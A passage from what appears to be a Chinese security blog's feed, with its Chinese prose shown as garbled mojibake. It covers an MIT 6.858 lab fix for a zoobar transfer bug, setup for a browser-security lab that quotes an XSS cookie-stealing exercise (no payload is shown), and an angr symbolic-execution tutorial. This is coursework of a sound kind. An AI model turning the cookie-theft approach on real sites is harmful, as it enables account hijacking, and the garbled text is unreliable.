responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br></code></pre></td></tr></table></figure><p>è¯´æ˜ä¸»è¦çš„å¤„ç†é€»è¾‘åº”å½“æ˜¯åœ¨ <code>zoobar/bank.py</code> ä¸­çš„ <code>transfer()</code> å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä»£ç å®¡è®¡+ä¿®å¤ç¯èŠ‚äº†ï¼Œè¯¥å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘ä¸»è¦å°±æ˜¯å¼€å¤´è¿™ä¸€æ®µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    persondb = person_setup()<br>    senderp = persondb.query(Person).get(sender)<br>    recipientp = persondb.query(Person).get(recipient)<br><br>    sender_balance = senderp.zoobars - zoobars<br>    recipient_balance = recipientp.zoobars + zoobars<br><br>    <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError()<br><br>    senderp.zoobars = sender_balance<br>    recipientp.zoobars = recipient_balance<br>    persondb.commit()<br><br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼š</p><ul><li>ç¼ºå¤±äº†å¯¹ transfer æ•°é‡ä¸ºè´Ÿçš„æ£€æŸ¥</li><li>é‡å¤èµ‹å€¼å¯¼è‡´å¯¹ self-transfer çš„æƒ…å†µè®¡ç®—é”™è¯¯</li></ul><p>ä¿®æ”¹çš„åŠæ³•å…¶å®æ¯”è¾ƒç®€å•ï¼Œç”±äº username ä¸ºä¸»é”®ï¼Œæ•…è‹¥ <code>sender == recipient</code>ï¼Œç›´æ¥è·³è¿‡è½¬è´¦æ“ä½œå³å¯ï¼ŒåŒæ—¶å¯¹ transfer æ•°é‡ä¸ºè´Ÿæ•°çš„æƒ…å†µç›´æ¥è½¬ä¸º 0 å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    <span class="hljs-comment"># for zoobars &lt; 0, convert it to 0</span><br>    <span class="hljs-keyword">if</span> zoobars &lt; <span class="hljs-number">0</span>:<br>        zoobars = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># if self-transfer, we don&#x27;t need to do anything</span><br>    <span class="hljs-keyword">if</span> sender != recipient:<br>        persondb = person_setup()<br>        senderp = persondb.query(Person).get(sender)<br>        recipientp = persondb.query(Person).get(recipient)<br><br>        sender_balance = senderp.zoobars - zoobars<br>        recipient_balance = recipientp.zoobars + zoobars<br><br>        <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError()<br><br>        senderp.zoobars = sender_balance<br>        recipientp.zoobars = recipient_balance<br>        persondb.commit()<br>    <br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡æ‰€æœ‰æ£€æŸ¥</p><p><img src="https://s2.loli.net/2022/12/25/GYVItmEXyuZCUfo.png" alt="image.png"></p><p>è‡³æ­¤ï¼ŒLab 3 å…¨éƒ¨å®Œæˆ</p><h1>0x04.Lab 4: Browser securityï¼ˆuncompletedï¼‰</h1><h2 id="Introduction-3">Introduction</h2><p>æœ¬ Lab ä¸»è¦å¸¦å¤§å®¶åšåŸºäºæµè§ˆå™¨çš„æ”»å‡»ï¼ˆbrowser-based attacksï¼Œå…¶å®å°±æ˜¯ web æ‰‹ç©çš„é‚£ä¸€å¥—ï¼‰ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>Part 1ï¼šè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆcross-site scripting attackï¼ŒXSSï¼‰</li><li>Part 2ï¼šä¾§ä¿¡é“ä¸é’“é±¼æ”»å‡»ï¼ˆside channel and phishing attackï¼‰</li><li>Part 3ï¼šä¸€ä¸ªç®€å•çš„è •è™«ï¼ˆa profile wormï¼‰</li></ul><h2 id="Network-setup">Network setup</h2><p>å› ä¸ºæˆ‘ä»¬éœ€è¦åœ¨ web æµè§ˆå™¨æ„é€ æ”»å‡»ï¼Œä¸ºäº†ä¿è¯è¯„åˆ†ç³»ç»Ÿæ­£å¸¸ï¼Œæˆ‘ä»¬çš„ zoobar web æœåŠ¡å™¨å¿…é¡»è¦åœ¨ <code>http://localhost:8080/</code> ä¸Šè¿›è¡Œè®¿é—®</p><p><s>å¦‚æœä½ æ˜¯ä½¿ç”¨ KVM æˆ– VirtualBoxï¼Œè‡ªå·±å›å»ç¿»å®éªŒæ‰‹å†Œ</s>ï¼›å¦‚æœä½ ä½¿ç”¨ VMWareï¼Œæˆ‘ä»¬å°†é€šè¿‡ ssh è¿›è¡Œç«¯å£è½¬å‘</p><p>é¦–å…ˆæ‰¾åˆ°ä½ çš„è™šæ‹Ÿæœºçš„ IPï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr show dev eth0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/25/COioRUJdS81apIG.png" alt="image.png"></p><p>å¯¹äº Mac å’Œ Linux ç”¨æˆ·ï¼Œåœ¨å®¿ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh -L localhost:8080:localhost:8080 student@VM-IP-ADDRESS</span><br>student@VM-IP-ADDRESS&#x27;s password: 6858<br></code></pre></td></tr></table></figure><p>å¯¹äº Windows ç”¨æˆ·ï¼Œ<s>æ²¡æ•‘äº†ç­‰æ­»å§</s>ï¼Œå¦‚æœä½ ç”¨çš„æ˜¯ PuTTYï¼Œå¯ä»¥æ ¹æ®è¿™äº›  <a href="https://web.archive.org/web/20140811071925/http://www.cs.uu.nl/technical/services/ssh/putty/puttyfw.html">instructions</a> å®Œæˆè®¾ç½®ï¼Œ<s>å¦‚æœä½ ç”¨çš„æ˜¯ OpenSSH é‚£å°±ç­‰æ­»å§</s></p><h2 id="Web-browser">Web browser</h2><p>æœ¬ Lab æ¨èä½¿ç”¨  <a href="https://www.mozilla.com/firefox/">Mozilla Firefox</a> ï¼Œ <s>è¯´æ˜¯ Firefox å¯ä»¥åœ¨è®¸å¤šç§OS ä¸Šè·‘ä½†ğŸ‘´å¯»æ€ Chrome ä¸ç…§æ ·èƒ½è€Œä¸”åº”ç”¨èŒƒå›´ä¸çŸ¥é“æ¯” Firefox å¤šå¤šå°‘äº†</s> ï¼Œè‹¥å¼€å¯äº† ad-blocking ç­‰æ’ä»¶åˆ™éœ€è¦å°†å…¶å…³é—­</p><h2 id="Setting-up-the-web-server">Setting up the web server</h2><p>é¦–å…ˆè¿˜æ˜¯æŒ‰æƒ¯ä¾‹ä¿å­˜ Lab 3 çš„ç­”æ¡ˆï¼Œåˆ‡åˆ° Lab 4 åˆ†æ”¯ï¼Œmake ä¸€ä¸‹æ£€æŸ¥æœ‰æ²¡æœ‰é—®é¢˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~$ cd lab<br>student@vm-6858:~/lab$ git commit -am &#x27;my solution to lab3&#x27;<br>[lab3 c54dd4d] my solution to lab3<br> 1 files changed, 1 insertions(+), 0 deletions(-)<br>student@vm-6858:~/lab$ git pull<br>Already up-to-date.<br>student@vm-6858:~/lab$ git checkout -b lab4 origin/lab4<br>Branch lab4 set up to track remote branch lab4 from origin.<br>Switched to a new branch &#x27;lab4&#x27;<br>student@vm-6858:~/lab$ make<br>...<br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰æƒ¯ä¾‹ç”¨ä¸‹é¢çš„è¯­å¥åœ¨ 8080 ç«¯å£è·‘ zookdï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~/lab$ ./zookd 8080<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨  <code>http://localhost:8080/</code> å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ Zoobar é¡µé¢<s>è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„è€æ ·å­</s></p><p><img src="https://s2.loli.net/2022/12/25/dU7ZvOKPLX4mzs9.png" alt="image.png"></p><h2 id="Crafting-attacks">Crafting attacks</h2><p>æœ¬ Lab ä¸­æˆ‘ä»¬å°†ç”¨ä¸åŒçš„æ”»å‡»æ‰‹æ®µæ¥æ”»å‡» zoobarï¼Œè¯„æµ‹ç³»ç»Ÿå°†åœ¨æ¸…ç©ºæ³¨å†Œç”¨æˆ·æ•°æ®åº“ï¼ˆé™¤äº† <code>&quot;attacker&quot;</code> ç”¨æˆ·ï¼‰åè¿è¡Œæˆ‘ä»¬çš„æ”»å‡»è„šæœ¬ï¼Œä¸å‰é¢çš„ Lab ç±»ä¼¼çš„æ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡ <code>make check</code> æ¥è¿›è¡Œæ£€æŸ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥æ£€æŸ¥å¹¶ä¸å¤Ÿå½»åº•ï¼ˆå°¤å…¶æ˜¯å¯¹äºæ¡ä»¶ç«äº‰è€Œè¨€ï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¤šè¿è¡Œå‡ æ¬¡æ¥ç¡®è®¤æ”»å‡»æˆåŠŸ</p><p>å¯¹äº Exercise 5ã€13ã€14 ä¸ challenge è€Œè¨€ï¼Œ<code>make check</code> è„šæœ¬ä¸è¶³ä»¥çœ‹å‡ºç«™ç‚¹åœ¨æ”»å‡»å‰åçš„åŒºåˆ«ï¼Œå› æ­¤è¿™éœ€è¦æˆ‘ä»¬è‡ªè¡Œå®Œæˆå¯¹æ¯”ï¼ˆMIT çš„è€å¸ˆä¹Ÿä¼šæ‰‹åŠ¨å®Œæˆè¯„æµ‹ï¼Œ <s>ä»–çœŸçš„ğŸ‘´å“­æ­»</s> ï¼‰ï¼›<code>make check</code> åœ¨è¿è¡Œæ—¶ä¼šåœ¨ <code>lab4-tests/</code> ä¸‹ç”Ÿæˆæ”»å‡»é¡µé¢åº”æœ‰çš„å¤–è§‚çš„å›¾ç‰‡ï¼ˆ<code>answer-XX.ref.png</code>ï¼‰ä¸æˆ‘ä»¬çš„æ”»å‡»é¡µé¢çš„å®é™…çš„æ ·å­ï¼ˆ<code>answer-XX.png</code>ï¼‰ï¼Œæˆ‘ä»¬åº”å½“è¦ç¡®ä¿ä¸¤è€…åº”å½“ä¸€è‡´</p><h2 id="Part-1-a-cross-site-scripting-XSS-attack">Part 1: a cross-site scripting (XSS) attack</h2><p>zoobar çš„ç”¨æˆ·ç•Œé¢æœ‰ä¸€ä¸ªèƒ½ä»ç™»å…¥ç”¨æˆ·çš„æµè§ˆå™¨çªƒå–å…¶ cookie çš„æ¼æ´ï¼ˆè‹¥æ”»å‡»è€…èƒ½è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è¿æ¥ï¼‰ï¼Œæˆ‘ä»¬çš„å·¥ä½œä¾¿æ˜¯æ„é€ è¿™æ ·ä¸€ä¸ªé“¾æ¥</p><p>éœ€æ±‚çš„å‰ç½®çŸ¥è¯†ï¼šJavascriptï¼ŒDOM ç­‰</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼Œåœ¨  <code>answer-1.js</code> ä¸­ç¼–å†™æ”»å‡»è„šæœ¬æ‰“å°å‡ºç”¨æˆ·çš„ cookieï¼Œæœ¬åœ°æµ‹è¯•çš„è¯å°±ä¿ç•™ä¸€ä»½ <code>zoobar/templates/users.html</code> çš„æ‹·è´å¹¶æ·»åŠ   <code>&lt;script&gt;</code>  æ ‡ç­¾æ¥å¼•å…¥æ”»å‡»è„šæœ¬ï¼š</p><blockquote><p><strong>Exercise 1: Print cookie.</strong></p><p>Cookies are HTTPâ€™s main mechanism for tracking users across requests. If an attacker can get ahold of another userâ€™s cookie, they can completely impersonate that other user. For this exercise, your goal is simply to print the cookie of the currently logged-in user when they access the â€œUsersâ€ page.</p><ol><li><p>Read about how <a href="https://developer.mozilla.org/en-US/docs/Web/API/document.cookie">cookies are accessed from Javascript</a>.</p></li><li><p>Save a copy of <code>zoobar/templates/users.html</code> (youâ€™ll need to restore this original version later). Add a <code>&lt;script&gt;</code> tag to <code>users.html</code> that prints the logged-in userâ€™s cookie using <code>alert()</code></p><p>Your script might not work immediately if you made a Javascript programming error. Fortunately, Chrome has fantastic debugging tools accessible in the Inspector: the JavaScript console, the DOM inspector, and the Network monitor. The JavaScript console lets you see which exceptions are being thrown and why. The DOM Inspector lets you peek at the structure of the page and the properties and methods of each node it contains. The Network monitor allows you to inspect the requests going between your browser and the website. By clicking on one of the requests, you can see what cookie your browser is sending, and compare it to what your script prints.</p></li><li><p>Put the contents of your script in a file named <code>answer-1.js</code>. Your file should only contain javascript (donâ€™t include <code>&lt;script&gt;</code> tags).</p></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸å¦‚ä¹°ä¸ª CTF è¯¾&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ret2libc" scheme="http://blog.arttnba3.cn/tags/ret2libc/"/>
    
    <category term="æ ˆæº¢å‡º" scheme="http://blog.arttnba3.cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="ç¬¦å·æ‰§è¡Œ" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ret2shellcode" scheme="http://blog.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="å®éªŒç¬”è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="Concolic Execution" scheme="http://blog.arttnba3.cn/tags/Concolic-Execution/"/>
    
  </entry>
  
  <entry>
    <title>ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³•</title>
    <link href="http://blog.arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/"/>
    <id>http://blog.arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/</id>
    <published>2022-11-23T18:48:35.000Z</published>
    <updated>2022-12-02T18:23:54.271Z</updated>
    
    <content type="html"><![CDATA[<p>ä½ è¯´çš„å¯¹ï¼Œä½†æ˜¯ <a href="https://github.com/angr/angr">angr</a> æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶åˆ†ææ¡†æ¶â€¦</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://github.com/angr/angr">angr</a> æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶<strong>æ··åˆ</strong>ï¼ˆConcolicï¼‰åˆ†ææ¡†æ¶ï¼Œä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—å®ç”¨çš„äºŒè¿›åˆ¶åˆ†æå·¥å…·ï¼Œæ›´å¤šå…³äº angr çš„ä»‹ç»ä¿¡æ¯å¯ä»¥çœ‹ä»–ä»¬çš„ <a href="https://angr.io">å®˜ç½‘</a> ï¼Œå…³äº angr æä¾›çš„ API åˆ™å¯ä»¥æŸ¥çœ‹<a href="https://api.angr.io/">æ–‡æ¡£</a></p><p><a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a> æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„å…¥é—¨çº§ angr ç»ƒæ‰‹é¡¹ç›®ï¼Œåˆšå¥½ç¬”è€…æœ€è¿‘åœ¨å­¦ angr ç›¸å…³çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å†³å®šä»è¿™ä¸ªé¡¹ç›®å¼€å§‹å…¥é—¨</p><h2 id="PRE-å®‰è£…-angr-åŠç›¸å…³ç»„ä»¶">PRE.å®‰è£… angr åŠç›¸å…³ç»„ä»¶</h2><p>é¦–å…ˆæ˜¯ä¸€äº›ä¾èµ–é¡¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure><p>angr æœ¬ä½“å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ <a href="https://github.com/angr/angrop">angrop</a>ï¼Œå¯ä»¥è‡ªåŠ¨æ”¶é›† ROP gadget ä»¥åŠæ„å»º ROP chain</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angrop</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/patcherex">patcherex</a> ä¹Ÿæ˜¯ angr å›¢é˜Ÿå¼€å‘çš„ï¼Œç”¨ä»¥è¿›è¡Œè‡ªåŠ¨åŒ–çš„äºŒè¿›åˆ¶åŠ å›º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install nasm clang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install clang-10 gcc-avr binutils-avr avr-libc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/angr/patcherex.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> patcherex</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install -e .</span><br></code></pre></td></tr></table></figure><blockquote><p>é˜¿é‡Œäº‘æºå¥½åƒå¦¹æœ‰ <code>compilerex</code> è¿™ä¸ªä¾èµ–é¡¹ï¼Œåæ­£æœ€åğŸ‘´ä¹Ÿå¦¹å®‰è£…ä¸Šï¼Œéš¾å—</p></blockquote><p><a href="https://github.com/angr/rex">rex</a> åˆ™æ˜¯ angr å›¢é˜Ÿå¼€å‘çš„è‡ªåŠ¨ exp ç”Ÿæˆå™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ğŸ‘´å¦¹å®‰æˆï¼Œçœ‹çœ‹å°±å¥½</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/angr-management">angr-management</a> åˆ™æ˜¯å›¾å½¢åŒ–çš„ angr ç•Œé¢ï¼Œå®‰å¥½ä¹‹åç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ <code>angr-management</code> å³å¯ç›´æ¥å¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr-management</span><br></code></pre></td></tr></table></figure><h2 id="PRE2-angr-ctf-åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—">PRE2. angr-ctf åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—</h2><p>é¦–å…ˆæŠŠé¡¹ç›®æ‹‰åˆ°æœ¬åœ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jakespringer/angr_ctf.git</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿›å…¥åˆ°ä½ æƒ³åšçš„é¢˜ç›®ç›®å½•ä¸‹ä½¿ç”¨è„šæœ¬è¿›è¡Œç¼–è¯‘ï¼Œæ¯”å¦‚è¯´ <code>00_angr_find</code>ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šä¸€ä¸ªç§å­ä»¥åŠè¾“å‡ºçš„æ–‡ä»¶åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> 00_angr_find/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py</span> <br>Usage: ./generate.py [seed] [output_file]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py 114514 00_angr_find</span><br></code></pre></td></tr></table></figure><h1>0x01. angr-ctfï¼šåŸºæœ¬ç”¨æ³•</h1><h2 id="00-angr-findï¼šè·¯å¾„æœç´¢">00_angr_findï¼šè·¯å¾„æœç´¢</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œå‘ç°å…¶ä¼šè¯»å…¥ 8 å­—èŠ‚åä½¿ç”¨ä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°å¤„ç†ï¼Œæœ€åä¸å¯†ç  <code>&quot;XFQUUEQF&quot;</code> å¯¹æ¯”ï¼š<br><img src="https://s2.loli.net/2022/10/31/vcWPp1GO7uHA8q6.png" alt="image.png"></p><p>æŒ‰ç…§ä¼ ç»Ÿçš„åšé€†å‘çš„æ–¹æ³•æ˜¯å»é€† <code>complex_function()</code> ï¼Œé€†å‡ºé€»è¾‘åå†™å‡ºè§£å¯†è„šæœ¬ï¼Œä½†æœ‰äº† angr ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨<strong>ç¬¦å·æ‰§è¡Œ</strong>ï¼ˆsymbolic executionï¼‰æ¥è¿›è¡Œè·¯å¾„çº¦æŸçš„è‡ªåŠ¨æ±‚è§£</p><blockquote><p>ç¬¦å·æ‰§è¡Œç®€å•ç†è§£ä¾¿æ˜¯å°†å˜é‡ä½œä¸ºç¬¦å·å­˜å‚¨ï¼Œé€šè¿‡åˆ†æè·¯å¾„çº¦æŸè·å¾—ç”±ç¬¦å·ç»„æˆçš„è¡¨è¾¾å¼ç»„ï¼Œæœ€åå¯¹å…¶è¿›è¡Œæ±‚è§£</p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ±‚è§£çš„è·¯å¾„çº¦æŸä¾¿æ˜¯æ‰§è¡Œåˆ°è¾“å‡º <code>&quot;Good Job.&quot;</code> çš„è·¯å¾„ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©æœ€åçš„è¾“å‡ºç‚¹ <code>0x80492F0</code>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/hdaX8FY9ZVcvIRH.png" alt="image.png"></p><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬æ¥çœ‹ angr çš„åŸºæœ¬ç”¨æ³•</p><h3 id="angr-Project-é¡¶å±‚æ¥å£">angr.Project - é¡¶å±‚æ¥å£</h3><p>æˆ‘ä»¬è‹¥è¦ä½¿ç”¨ angr æ¥åˆ†æä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç¬¬ä¸€æ­¥åˆ™æ˜¯åˆ›å»ºä¸€ä¸ª <code>angr.Project</code> ç±»â€”â€”æˆ‘ä»¬ä¸€åˆ‡åç»­æ“ä½œéƒ½å°†åŸºäºè¿™ä¸ªç±»å®ä¾‹è¿›è¡Œå±•å¼€ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span> <span class="hljs-comment"># file to be analyzed</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(bin_path)<br>WARNING | <span class="hljs-number">2022</span>-<span class="hljs-number">11</span>-<span class="hljs-number">23</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">30</span>,006 | cle.loader | The main binary <span class="hljs-keyword">is</span> a position-independent executable. It <span class="hljs-keyword">is</span> being loaded <span class="hljs-keyword">with</span> a base address of <span class="hljs-number">0x400000</span>.<br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ª project è·å–å¯¹åº”äºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch     <span class="hljs-comment"># architecture of the binary file</span><br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(proj.entry)    <span class="hljs-comment"># entry point of the binary file</span><br><span class="hljs-string">&#x27;0x401060&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename <span class="hljs-comment"># name of the binary file</span><br><span class="hljs-string">&#x27;./test&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p><code>arch</code> æ˜¯ä¸€ä¸ª <code>archiinfo.Arch</code> ç±»å®ä¾‹ï¼Œå…¶åŒ…å«äº†è¿è¡Œè¯¥æ–‡ä»¶çš„ CPU ä¿¡æ¯ç­‰å„ç§æ•°æ®</p><ul><li><p><code>arch.bits</code> &amp; <code>arch.bytes</code> ï¼šCPU çš„å­—é•¿ï¼ˆå•ä½ä¸ºä½/å­—èŠ‚ï¼‰</p></li><li><p><code>arch.name</code>ï¼šæ¶æ„åï¼Œä¾‹å¦‚  <em>X86</em></p></li><li><p><code>arch.memory_endness</code>ï¼šç«¯åºï¼Œå¤§ç«¯ä¸º <code>Endness.BE</code> ï¼Œå°ç«¯ä¸º <code>Endness.LE</code></p><blockquote><p>æºç é‡Œè¿˜æœ‰ä¸€ä¸ª â€œä¸­ç«¯åºâ€ <code>Endness.ME</code> ï¼šï¼‰</p></blockquote></li></ul></li></ul><h4 id="â‘ -factory-å®ç”¨ç±»å·¥å‚">â‘  factory - å®ç”¨ç±»å·¥å‚</h4><p><code>project.factory</code> ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›å®ç”¨çš„ç±»çš„æ„é€ å™¨</p><h5 id="I-block-åŸºæœ¬å—">I. block - åŸºæœ¬å—</h5><p>angr ä»¥åŸºæœ¬å—ä¸ºå•ä½åˆ†æä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>project.factory.block(address)</code> 